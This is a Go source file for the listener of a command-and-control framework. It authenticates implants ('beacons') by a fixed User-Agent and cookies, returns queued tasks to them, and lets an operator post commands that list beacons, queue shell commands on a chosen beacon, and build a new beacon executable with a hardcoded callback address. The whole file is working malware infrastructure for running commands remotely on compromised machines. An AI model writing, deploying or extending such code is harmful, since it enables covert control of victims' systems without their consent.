package main

import (
	"encoding/binary"
	"fmt"
	"github.com/gorilla/websocket"
	"io/ioutil"
	"net/http"
)

var expectedHeaders = map[string]string{
	"User-Agent": "Value1",
}

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener) {
	headers := r.Header

	for header, expectedValue := range expectedHeaders {
		value := headers.Get(header)

		if value != expectedValue {
			http.Error(w, fmt.Sprintf("Forbidden: Header value for %s does not match", header), http.StatusForbidden)
			return
		}
	}

	if r.Method == http.MethodGet {
		cookies := r.Cookies()
		cookie := ""

		for _, i := range cookies {
			cookie += i.Value
		}
		res, love := GET_handler(cookie, listener, r)
		if !love {
			http.Error(w, fmt.Sprintf("Forbidden: Cookie for %s does not match", cookie), http.StatusForbidden)
			return
		} else {
			w.WriteHeader(http.StatusOK)
			res_tmp := make([]byte, 4)
			binary.LittleEndian.PutUint32(res_tmp, 0xbeebeebe)
			res = append(res, res_tmp...)
			w.Write(res)
			res = make([]byte, 0)
		}

	}

	if r.Method == http.MethodPost {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading request body", http.StatusInternalServerError)
			return
		}
		defer r.Body.Close()
		w.WriteHeader(http.StatusOK)

		if headers.Get("Iamfrom") == "C2AUTH" {
			var res []byte
			switch Check_Command(body) {
			case 0:
				break
			case BEACONS:
				tmp := len(listener.Beacons)
				res = append(res, IntToUint8(tmp))
				Send_Bytes_to(w, res, "http://localhost:50049/c2", expectedHeaders)
				res = make([]byte, 0)
				break
			case SHELL:
				body = body[4:]
				id := int(body[0])
				var job Job
				job.command = uint16(body[1])<<8 | uint16(body[2])
				job.shell = string(body[3:])
				job.funny = true

				listener.Beacons[id].jobs = append(listener.Beacons[id].jobs, job)
			case NEWBEACON:
				var config OblivionisConfig
				config.c2addr = "127.0.0.1"
				config.c2port = 8080
				config.useragent = "Value1"
				config.a = listener.A
				config.url = ""
				config.sleep = 1000
				config.host = "testhost"
				GenerateOblivionis(config, "./beacons/beacon.exe")

				println("had made beacon")
			}

		} else {
			res, love := POST_handler(body, listener, r, w)
			if !love {
				http.Error(w, fmt.Sprintf("Forbidden: bad regist or not get"), http.StatusForbidden)
				return
			} else {
				w.Write(res)
				res = make([]byte, 0)
			}
		}
	}
}

func main() {
	uri := ""
	port1 := 8080
	port2 := 50050
	lisname := "ilovec2"
	go StartListener(uri, port1, lisname)
	StartClient("client", port2)

}
